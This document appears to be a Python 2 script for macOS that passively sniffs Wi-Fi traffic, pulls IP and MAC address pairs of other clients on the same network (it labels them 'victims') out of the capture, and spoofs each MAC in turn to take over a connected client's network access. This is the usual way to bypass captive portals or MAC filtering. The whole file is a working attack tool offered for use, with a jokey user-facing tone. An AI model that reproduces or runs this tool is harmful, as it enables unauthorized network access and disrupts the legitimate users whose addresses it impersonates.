#!/usr/bin/python

import re
import os
import subprocess
import sys
import time
import binascii

from pcapfile import savefile
from pcapfile.protocols.linklayer import ethernet
from pcapfile.protocols.network import ip

WIRELESS_INTERFACE = "en0"

def get_ip():
    p = subprocess.Popen(["ifconfig", WIRELESS_INTERFACE], stdout=subprocess.PIPE)
    for line in p.stdout.readlines():
        m = re.search("inet (.*?) ", line)
        if (m):
            return m.group(1)
    raise Exception("Couldn't get current IP")

def set_mac_addr(mac):
    os.system("airport -z")
    os.system("ifconfig en0 ether %s" % mac)

def connect_to_network(ssid):
    os.system("airport")

def get_current_network_channel():
    p = subprocess.Popen(["airport", "-I"], stdout=subprocess.PIPE)
    for line in p.stdout.readlines():
        m = re.search("channel: (.*)$", line)
        if (m):
            return m.group(1)
    raise Exception("Couldn't get network channel")

def get_current_network_ssid():
    p = subprocess.Popen(["airport", "-I"], stdout=subprocess.PIPE)
    for line in p.stdout.readlines():
        m = re.search(" SSID: (.*)$", line)
        if (m):
            return m.group(1)
    raise Exception("Couldn't get network channel")

def sniff(chan, outfile):
    os.system("rm /tmp/airport* 2> /dev/null")
    p = subprocess.Popen(["airport", WIRELESS_INTERFACE, "sniff", chan], stdout=subprocess.PIPE)
    time.sleep(25)
    os.system("""kill -2 `ps aux | grep "airport .* sniff" | grep -v grep | awk '{print $2}'`""")
    time.sleep(1)
    os.system("mv /tmp/airport* %s" % outfile)

def check_connection():
    return True

def parse_pcap(pcap):
    pcap_file = open(pcap)
    capfile = savefile.load_savefile(pcap_file)
    ip_to_mac = dict()

    for packet in capfile.packets:
        raw = packet.raw()
        if len(raw) <= 75:
            continue
        mac = ""
        for i in range(0x23, 0x29):
            mac += "%02x:" % ord(raw[i])
        mac = mac[:-1]

        ip = ""
        for i in range(71, 75):
            ip += "%d." % ord(raw[i])
        ip = ip[:-1]

        ip_to_mac[ip] = mac

    mac_list = []
    for ip in ip_to_mac:
        mac_list.append((ip, ip_to_mac[ip]))
    return mac_list

def main():
    try:
        chan = get_current_network_channel()
        chan = "1"
        ssid = get_current_network_ssid()
        my_ip = re.match("(.*\..*\.).*\..", get_ip()).group(1)
    except:
        print "Connect to the wifi first!"
        sys.exit(0)

    print "Hi Psycho, let me find some wifi for you!"
    answer = raw_input("Sniff some more? (y/n): ")
    if (answer[0] == "y"):
        sniff(chan, "out.pcap")

    victims = []
    for (ip, mac) in parse_pcap("out.pcap"):
        if (re.match(my_ip, ip)):
            victims.append((ip, mac))

    counter = 0
    print "Found %d different ones to try" % len(victims)
    for (ip, mac) in victims:
        counter += 1
        print "%s - %s, Number %d" % (ip, mac, counter)
        set_mac_addr(mac)

        raw_input("Connect to the wifi now (press enter once connected) ")
        #connect_to_network(ssid)

        try:
            my_new_ip = get_ip()
        except:
            print "You didn't connect to the wifi before continuing!"
            continue
        if my_new_ip != ip:
            print "Didn't work, trying another"
            continue

        answer = raw_input("Try connecting to the internet, it might have worked. Did it? (y/n) ")
        if (answer[0] == "y"):
            print "Have fun!"
            break
            
        #if check_connection() == True:
        #    break

if __name__ == "__main__":
    main()
